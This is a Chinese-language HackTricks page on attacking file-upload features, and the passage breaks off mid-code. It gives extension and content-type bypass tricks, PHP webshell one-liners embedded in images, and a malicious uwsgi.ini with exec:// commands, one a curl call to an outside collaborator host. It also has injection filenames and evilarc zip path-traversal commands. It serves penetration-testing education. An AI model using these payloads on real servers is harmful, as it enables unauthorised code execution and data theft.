<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>File Upload</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../../favicon.svg">
        <link rel="shortcut icon" href="../../favicon.png">
        <link rel="stylesheet" href="../../css/variables.css">
        <link rel="stylesheet" href="../../css/general.css">
        <link rel="stylesheet" href="../../css/chrome.css">
        <link rel="stylesheet" href="../../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../../highlight.css">
        <link rel="stylesheet" href="../../tomorrow-night.css">
        <link rel="stylesheet" href="../../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="文件上传"><a class="header" href="#文件上传">文件上传</a></h1>
<p>{% hint style="success" %}
学习与实践 AWS 黑客技术：<img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><br />
学习与实践 GCP 黑客技术：<img src="../../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="../../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>支持 HackTricks</summary>
<ul>
<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>Telegram 群组</strong></a> 或 <strong>关注</strong> 我们的 <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub 仓库提交 PR 分享黑客技巧。</li>
</ul>
</details>
{% endhint %}
<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
<p>如果你对 <strong>黑客职业</strong> 感兴趣并想要攻克不可攻克的目标 - <strong>我们正在招聘！</strong> (<em>需要流利的波兰语书写和口语能力</em>).</p>
<p>{% embed url="https://www.stmcyber.com/careers" %}</p>
<h2 id="文件上传一般方法论"><a class="header" href="#文件上传一般方法论">文件上传一般方法论</a></h2>
<p>其他有用的扩展名：</p>
<ul>
<li><strong>PHP</strong>: <em>.php</em>, <em>.php2</em>, <em>.php3</em>, .<em>php4</em>, .<em>php5</em>, .<em>php6</em>, .<em>php7</em>, .phps, .<em>pht</em>, .<em>phtm, .phtml</em>, .<em>pgif</em>, <em>.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module</em></li>
<li><strong>在 PHPv8 中工作</strong>: <em>.php</em>, <em>.php4</em>, <em>.php5</em>, <em>.phtml</em>, <em>.module</em>, <em>.inc</em>, <em>.hphp</em>, <em>.ctp</em></li>
<li><strong>ASP</strong>: <em>.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml</em></li>
<li><strong>Jsp:</strong> <em>.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action</em></li>
<li><strong>Coldfusion:</strong> <em>.cfm, .cfml, .cfc, .dbm</em></li>
<li><strong>Flash</strong>: <em>.swf</em></li>
<li><strong>Perl</strong>: <em>.pl, .cgi</em></li>
<li><strong>Erlang Yaws Web Server</strong>: <em>.yaws</em></li>
</ul>
<h3 id="绕过文件扩展名检查"><a class="header" href="#绕过文件扩展名检查">绕过文件扩展名检查</a></h3>
<ol>
<li>如果适用，<strong>检查</strong> <strong>之前的扩展名</strong>。也可以使用一些 <strong>大写字母</strong> 测试它们：<em>pHp, .pHP5, .PhAr ...</em></li>
<li><em>检查 <strong>在执行扩展名之前添加有效扩展名</strong>（也使用之前的扩展名）：</em></li>
</ol>
<ul>
<li><em>file.png.php</em></li>
<li><em>file.png.Php5</em></li>
</ul>
<ol start="3">
<li>尝试在末尾添加 <strong>特殊字符</strong>。你可以使用 Burp 来 <strong>暴力破解</strong> 所有的 <strong>ascii</strong> 和 <strong>Unicode</strong> 字符。 (<em>注意你也可以尝试使用 <strong>之前</strong> 提到的 <strong>扩展名</strong></em>)</li>
</ol>
<ul>
<li><em>file.php%20</em></li>
<li><em>file.php%0a</em></li>
<li><em>file.php%00</em></li>
<li><em>file.php%0d%0a</em></li>
<li><em>file.php/</em></li>
<li><em>file.php.\</em></li>
<li><em>file.</em></li>
<li><em>file.php....</em></li>
<li><em>file.pHp5....</em></li>
</ul>
<ol start="4">
<li>尝试通过 <strong>欺骗服务器端的扩展解析器</strong> 来绕过保护，使用像 <strong>双重</strong> 扩展名或 <strong>添加垃圾</strong> 数据（<strong>空</strong> 字节）在扩展名之间。<em>你也可以使用 <strong>之前的扩展名</strong> 来准备更好的有效载荷。</em></li>
</ol>
<ul>
<li><em>file.png.php</em></li>
<li><em>file.png.pHp5</em></li>
<li><em>file.php#.png</em></li>
<li><em>file.php%00.png</em></li>
<li><em>file.php\x00.png</em></li>
<li><em>file.php%0a.png</em></li>
<li><em>file.php%0d%0a.png</em></li>
<li><em>file.phpJunk123png</em></li>
</ul>
<ol start="5">
<li>在之前的检查中添加 <strong>另一层扩展名</strong>：</li>
</ol>
<ul>
<li><em>file.png.jpg.php</em></li>
<li><em>file.php%00.png%00.jpg</em></li>
</ul>
<ol start="6">
<li>尝试将 <strong>exec 扩展名放在有效扩展名之前</strong>，并祈祷服务器配置错误。（有助于利用 Apache 配置错误，其中任何带有扩展名 <strong>_</strong>.php**_** 的内容，但不一定以 .php 结尾的内容将执行代码）：</li>
</ol>
<ul>
<li><em>ex: file.php.png</em></li>
</ul>
<ol start="7">
<li>使用 <strong>Windows</strong> 中的 <strong>NTFS 备用数据流 (ADS)</strong>。在这种情况下，禁止扩展名后和允许扩展名前会插入一个冒号字符“:”。因此，服务器上将创建一个 <strong>带有禁止扩展名的空文件</strong>（例如“file.asax:.jpg”）。该文件可以稍后使用其他技术进行编辑，例如使用其短文件名。 “<strong>::$data</strong>”模式也可以用于创建非空文件。因此，在此模式后添加一个点字符也可能有助于绕过进一步的限制（例如“file.asp::$data.”）</li>
<li>尝试打破文件名限制。有效扩展名被截断。恶意 PHP 被保留。 AAA&lt;--SNIP--&gt;AAA.php</li>
</ol>
<pre><code># Linux 最大 255 字节
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # 在这里减去 4 并添加 .png
# 上传文件并检查响应允许多少个字符。假设 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# 制作有效载荷
AAA&lt;--SNIP 232 A--&gt;AAA.php.png
</code></pre>
<h3 id="绕过内容类型魔术数字压缩和调整大小"><a class="header" href="#绕过内容类型魔术数字压缩和调整大小">绕过内容类型、魔术数字、压缩和调整大小</a></h3>
<ul>
<li>通过将 <strong>Content-Type</strong> <strong>头</strong> 的 <strong>值</strong> 设置为以下内容来绕过 <strong>Content-Type</strong> 检查：<em>image/png</em> , <em>text/plain , application/octet-stream</em></li>
</ul>
<ol>
<li>Content-Type <strong>字典</strong>: <a href="https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt">https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt</a></li>
</ol>
<ul>
<li>通过在文件开头添加 <strong>真实图像的字节</strong> 来绕过 <strong>魔术数字</strong> 检查（混淆 <em>file</em> 命令）。或者在 <strong>元数据</strong> 中引入 shell：<br />
<code>exiftool -Comment="&lt;?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg</code><br />
<code>\</code> 或者你也可以 <strong>直接在图像中引入有效载荷</strong>：<br />
<code>echo '&lt;?php system($_REQUEST['cmd']); ?&gt;' &gt;&gt; img.png</code></li>
<li>如果 <strong>压缩被添加到你的图像</strong>，例如使用一些标准的 PHP 库如 <a href="https://www.php.net/manual/fr/book.image.php">PHP-GD</a>，那么之前的技术将无效。然而，你可以使用 <strong>PLTE 块</strong> <a href="https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html"><strong>在这里定义的技术</strong></a> 插入一些文本以 <strong>在压缩中存活</strong>。</li>
<li><a href="https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php"><strong>带有代码的 GitHub</strong></a></li>
<li>网页也可能在 <strong>调整图像大小</strong>，例如使用 PHP-GD 函数 <code>imagecopyresized</code> 或 <code>imagecopyresampled</code>。然而，你可以使用 <strong>IDAT 块</strong> <a href="https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html"><strong>在这里定义的技术</strong></a> 插入一些文本以 <strong>在压缩中存活</strong>。</li>
<li><a href="https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php"><strong>带有代码的 GitHub</strong></a></li>
<li>另一种制作 <strong>在图像调整大小中存活的有效载荷</strong> 的技术，使用 PHP-GD 函数 <code>thumbnailImage</code>。然而，你可以使用 <strong>tEXt 块</strong> <a href="https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html"><strong>在这里定义的技术</strong></a> 插入一些文本以 <strong>在压缩中存活</strong>。</li>
<li><a href="https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php"><strong>带有代码的 GitHub</strong></a></li>
</ul>
<h3 id="其他检查技巧"><a class="header" href="#其他检查技巧">其他检查技巧</a></h3>
<ul>
<li>找到一个 <strong>重命名</strong> 已上传文件的漏洞（以更改扩展名）。</li>
<li>找到一个 <strong>本地文件包含</strong> 漏洞以执行后门。</li>
<li><strong>可能的信息泄露</strong>：</li>
</ul>
<ol>
<li>上传 <strong>多次</strong>（并且在 <strong>同一时间</strong>）相同名称的 <strong>相同文件</strong></li>
<li>上传一个 <strong>已经存在</strong> 的 <strong>文件</strong> 或 <strong>文件夹</strong> 的 <strong>名称</strong> 的文件</li>
<li>上传一个 <strong>“.”, “..”, 或 “…” 作为其名称</strong> 的文件。例如，在 Apache 的 <strong>Windows</strong> 中，如果应用程序将上传的文件保存在 “/www/uploads/” 目录中，名称为 “.” 的文件将创建一个名为 “uploads” 的文件在 “/www/” 目录中。</li>
<li>上传一个可能不容易删除的文件，例如 <strong>“…:.jpg”</strong> 在 <strong>NTFS</strong> 中。（Windows）</li>
<li>在 <strong>Windows</strong> 中上传一个带有 <strong>无效字符</strong> 的文件，例如 <code>|&lt;&gt;*?”</code> 在其名称中。（Windows）</li>
<li>在 <strong>Windows</strong> 中上传一个使用 <strong>保留</strong>（<strong>禁止</strong>） <strong>名称</strong> 的文件，例如 CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, 和 LPT9。</li>
</ol>
<ul>
<li>还可以尝试 <strong>上传一个可执行文件</strong>（.exe）或一个 <strong>.html</strong>（不太可疑）文件，当被受害者意外打开时 <strong>将执行代码</strong>。</li>
</ul>
<h3 id="特殊扩展名技巧"><a class="header" href="#特殊扩展名技巧">特殊扩展名技巧</a></h3>
<p>如果你尝试将文件上传到 <strong>PHP 服务器</strong>， <a href="https://book.hacktricks.xyz/pentesting/pentesting-web/php-tricks-esp#code-execution-via-httaccess">查看 <strong>.htaccess</strong> 技巧以执行代码</a>。<br />
如果你尝试将文件上传到 <strong>ASP 服务器</strong>， <a href="../../network-services-pentesting/pentesting-web/iis-internet-information-services.html#execute-config-files">查看 <strong>.config</strong> 技巧以执行代码</a>。</p>
<p><code>.phar</code> 文件类似于 Java 的 <code>.jar</code>，但用于 PHP，并且可以 <strong>像 PHP 文件一样使用</strong>（通过 PHP 执行或在脚本中包含它...）</p>
<p><code>.inc</code> 扩展名有时用于仅用于 <strong>导入文件</strong> 的 PHP 文件，因此，在某些时候，可能有人允许 <strong>此扩展名被执行</strong>。</p>
<h2 id="jetty-rce"><a class="header" href="#jetty-rce"><strong>Jetty RCE</strong></a></h2>
<p>如果你可以将 XML 文件上传到 Jetty 服务器，你可以获得 <a href="https://twitter.com/ptswarm/status/1555184661751648256/photo/1">RCE，因为 <strong>新的 *.xml 和 *.war 会被自动处理</strong></a><strong>.</strong> 所以，如下图所示，将 XML 文件上传到 <code>$JETTY_BASE/webapps/</code> 并期待 shell！</p>
<p><img src="../../.gitbook/assets/image%20(1047).png" alt="https://twitter.com/ptswarm/status/1555184661751648256/photo/1" /></p>
<h2 id="uwsgi-rce"><a class="header" href="#uwsgi-rce"><strong>uWSGI RCE</strong></a></h2>
<p>有关此漏洞的详细探索，请查看原始研究：<a href="https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html">uWSGI RCE 利用</a>。</p>
<p>如果能够修改 <code>.ini</code> 配置文件，则可以在 uWSGI 服务器中利用远程命令执行（RCE）漏洞。uWSGI 配置文件利用特定语法来包含“魔术”变量、占位符和运算符。值得注意的是，<code>@</code> 运算符，作为 <code>@(filename)</code> 使用，旨在包含文件的内容。在 uWSGI 支持的各种方案中，“exec” 方案特别强大，允许从进程的标准输出读取数据。当处理 <code>.ini</code> 配置文件时，可以利用此功能进行恶意目的，例如远程命令执行或任意文件写入/读取。</p>
<p>考虑以下有害的 <code>uwsgi.ini</code> 文件示例，展示各种方案：</p>
<pre><code class="language-ini">[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
</code></pre>
<p>在解析配置文件时，负载的执行会发生。为了激活和解析配置，uWSGI 进程必须重新启动（可能是在崩溃后或由于拒绝服务攻击）或文件必须设置为自动重载。如果启用了自动重载功能，在检测到更改时会在指定的时间间隔内重新加载文件。</p>
<p>理解 uWSGI 配置文件解析的宽松性质至关重要。具体来说，讨论的负载可以插入到二进制文件中（例如图像或 PDF），进一步扩大潜在利用的范围。</p>
<h2 id="wget-文件上传ssrf-技巧"><a class="header" href="#wget-文件上传ssrf-技巧"><strong>wget 文件上传/SSRF 技巧</strong></a></h2>
<p>在某些情况下，您可能会发现服务器正在使用 <strong><code>wget</code></strong> 来 <strong>下载文件</strong>，并且您可以 <strong>指示</strong> <strong>URL</strong>。在这些情况下，代码可能会检查下载文件的扩展名是否在白名单中，以确保仅下载允许的文件。然而，<strong>此检查可以被绕过。</strong><br />
<strong>linux</strong> 中 <strong>文件名</strong> 的 <strong>最大</strong> 长度为 <strong>255</strong>，但是 <strong>wget</strong> 会将文件名截断为 <strong>236</strong> 个字符。您可以 <strong>下载一个名为 "A"*232+".php"+".gif"</strong> 的文件，这个文件名将 <strong>绕过</strong> <strong>检查</strong>（因为在这个例子中 <strong>".gif"</strong> 是一个 <strong>有效</strong> 扩展名），但 <code>wget</code> 会将文件重命名为 <strong>"A"*232+".php"</strong>。</p>
<pre><code class="language-bash">#Create file and HTTP server
echo "SOMETHING" &gt; $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
</code></pre>
<pre><code class="language-bash">#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================&gt;]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
</code></pre>
<p>注意，您可能正在考虑的<strong>另一个选项</strong>是使<strong>HTTP服务器重定向到不同的文件</strong>，这样初始URL将绕过检查，然后wget将下载重定向的文件并使用新名称。这<strong>不会工作</strong>，<strong>除非</strong>wget与<strong>参数</strong><code>--trust-server-names</code>一起使用，因为<strong>wget将下载重定向页面，并使用原始URL中指示的文件名称</strong>。</p>
<h2 id="工具"><a class="header" href="#工具">工具</a></h2>
<ul>
<li><a href="https://github.com/sAjibuu/Upload_Bypass">Upload Bypass</a> 是一个强大的工具，旨在帮助渗透测试人员和漏洞猎人测试文件上传机制。它利用各种漏洞奖励技术来简化识别和利用漏洞的过程，确保对Web应用程序进行全面评估。</li>
</ul>
<h2 id="从文件上传到其他漏洞"><a class="header" href="#从文件上传到其他漏洞">从文件上传到其他漏洞</a></h2>
<ul>
<li>将<strong>filename</strong>设置为<code>../../../tmp/lol.png</code>，尝试实现<strong>路径遍历</strong></li>
<li>将<strong>filename</strong>设置为<code>sleep(10)-- -.jpg</code>，您可能能够实现<strong>SQL注入</strong></li>
<li>将<strong>filename</strong>设置为<code>&lt;svg onload=alert(document.domain)&gt;</code>以实现XSS</li>
<li>将<strong>filename</strong>设置为<code>; sleep 10;</code>以测试一些命令注入（更多<a href="../command-injection.html">命令注入技巧在这里</a>）</li>
<li><a href="../xss-cross-site-scripting/#xss-uploading-files-svg"><strong>XSS</strong>在图像（svg）文件上传中</a></li>
<li><strong>JS</strong>文件<strong>上传</strong> + <strong>XSS</strong> = <a href="../xss-cross-site-scripting/#xss-abusing-service-workers"><strong>服务工作者</strong>利用</a></li>
<li><a href="../xxe-xee-xml-external-entity.html#svg-file-upload"><strong>XXE在svg上传中</strong></a></li>
<li><a href="../open-redirect.html#open-redirect-uploading-svg-files"><strong>通过上传svg文件的开放重定向</strong></a></li>
<li>尝试来自<a href="https://github.com/allanlw/svg-cheatsheet"><strong>https://github.com/allanlw/svg-cheatsheet</strong></a>的<strong>不同svg有效负载</strong>****</li>
<li><a href="https://mukarramkhalid.com/imagemagick-imagetragick-exploit/">著名的<strong>ImageTrick</strong>漏洞</a></li>
<li>如果您可以<strong>指示Web服务器从URL捕获图像</strong>，您可以尝试利用<a href="../ssrf-server-side-request-forgery/">SSRF</a>。如果此<strong>图像</strong>将被<strong>保存</strong>在某个<strong>公共</strong>网站上，您还可以指示来自<a href="https://iplogger.org/invisible/">https://iplogger.org/invisible/</a>的URL，并<strong>窃取每个访问者的信息</strong>。</li>
<li><a href="pdf-upload-xxe-and-cors-bypass.html"><strong>XXE和CORS</strong>绕过PDF-Adobe上传</a></li>
<li>特别制作的PDF以实现XSS：<a href="../xss-cross-site-scripting/pdf-injection.html">以下页面展示如何<strong>注入PDF数据以获得JS执行</strong></a>。如果您可以上传PDF，您可以准备一些将执行任意JS的PDF，按照给定的指示。</li>
<li>上传[eicar](<a href="https://secure.eicar.org/eicar.com.txt"><strong>https://secure.eicar.org/eicar.com.txt</strong></a>)内容以检查服务器是否有任何<strong>防病毒</strong></li>
<li>检查上传文件是否有任何<strong>大小限制</strong></li>
</ul>
<p>以下是您可以通过上传实现的前10个事项（来自<a href="https://twitter.com/SalahHasoneh1/status/1281274120395685889">这里</a>）：</p>
<ol>
<li><strong>ASP / ASPX / PHP5 / PHP / PHP3</strong>：Webshell / RCE</li>
<li><strong>SVG</strong>：存储的XSS / SSRF / XXE</li>
<li><strong>GIF</strong>：存储的XSS / SSRF</li>
<li><strong>CSV</strong>：CSV注入</li>
<li><strong>XML</strong>：XXE</li>
<li><strong>AVI</strong>：LFI / SSRF</li>
<li><strong>HTML / JS</strong>：HTML注入 / XSS / 开放重定向</li>
<li><strong>PNG / JPEG</strong>：像素洪水攻击（DoS）</li>
<li><strong>ZIP</strong>：通过LFI / DoS的RCE</li>
<li><strong>PDF / PPTX</strong>：SSRF / BLIND XXE</li>
</ol>
<h4 id="burp扩展"><a class="header" href="#burp扩展">Burp扩展</a></h4>
<p>{% embed url="https://github.com/portswigger/upload-scanner" %}</p>
<h2 id="魔法头字节"><a class="header" href="#魔法头字节">魔法头字节</a></h2>
<ul>
<li><strong>PNG</strong>：<code>"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03["</code></li>
<li><strong>JPG</strong>：<code>"\xff\xd8\xff"</code></li>
</ul>
<p>请参阅<a href="https://en.wikipedia.org/wiki/List_of_file_signatures">https://en.wikipedia.org/wiki/List_of_file_signatures</a>以获取其他文件类型。</p>
<h3 id="ziptar文件自动解压上传"><a class="header" href="#ziptar文件自动解压上传">Zip/Tar文件自动解压上传</a></h3>
<p>如果您可以上传一个将在服务器内部解压的ZIP，您可以做两件事：</p>
<h4 id="符号链接"><a class="header" href="#符号链接">符号链接</a></h4>
<p>上传一个包含软链接到其他文件的链接，然后，访问解压的文件时，您将访问链接的文件：</p>
<pre><code>ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
</code></pre>
<h3 id="在不同文件夹中解压"><a class="header" href="#在不同文件夹中解压">在不同文件夹中解压</a></h3>
<p>在解压过程中意外创建文件在目录中是一个重大问题。尽管最初假设这种设置可能会防止通过恶意文件上传进行操作系统级命令执行，但ZIP归档格式的层次压缩支持和目录遍历能力可以被利用。这使得攻击者能够绕过限制，通过操纵目标应用程序的解压功能逃离安全上传目录。</p>
<p>一个自动化的利用工具可以在 <a href="https://github.com/ptoomey3/evilarc"><strong>evilarc on GitHub</strong></a> 找到。该工具的使用方法如下：</p>
<pre><code class="language-python"># Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
</code></pre>
<p>此外，<strong>使用 evilarc 的符号链接技巧</strong>也是一个选项。如果目标是针对像 <code>/flag.txt</code> 这样的文件，则应在您的系统中创建指向该文件的符号链接。这确保了 evilarc 在操作过程中不会遇到错误。</p>
<p>下面是用于创建恶意 zip 文件的 Python 代码示例：</p>
<pre><code class="language-python">#!/usr/bin/python
import zipfile
from io import BytesIO

